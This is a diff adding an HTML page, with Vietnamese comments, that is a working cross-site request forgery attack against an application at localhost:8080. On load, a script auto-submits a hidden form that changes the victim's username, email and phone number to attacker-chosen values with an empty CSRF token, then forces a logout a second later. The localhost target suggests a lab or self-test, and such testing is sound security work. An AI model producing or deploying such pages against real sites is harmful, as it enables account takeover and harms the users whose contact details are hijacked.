@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF đổi email + đăng xuất</title>
+</head>
+<body>
+  <h2>Trang giả mạo CSRF đổi email & đăng xuất</h2>
+
+  <!-- Form đổi email, số điện thoại -->
+  <form id="changeInfoForm" action="http://localhost:8080/setting" method="POST">
+    <input type="hidden" name="csrfToken" value="" />
+    <input type="hidden" name="username" value="attackerUsername" />
+    <input type="hidden" name="email" value="attacker@example.com" />
+    <input type="hidden" name="phoneNumber" value="0123456789" />
+  </form>
+
+  <!-- Form đăng xuất -->
+  <form id="logoutForm" action="http://localhost:8080/signout" method="GET">
+  </form>
+
+  <script>
+    // Gửi form đổi thông tin trước
+    document.getElementById('changeInfoForm').submit();
+
+    // Sau 1 giây gửi form đăng xuất (để server kịp xử lý đổi info trước)
+    setTimeout(function() {
+      document.getElementById('logoutForm').submit();
+    }, 1000);
+  </script>
+</body>
+</html>
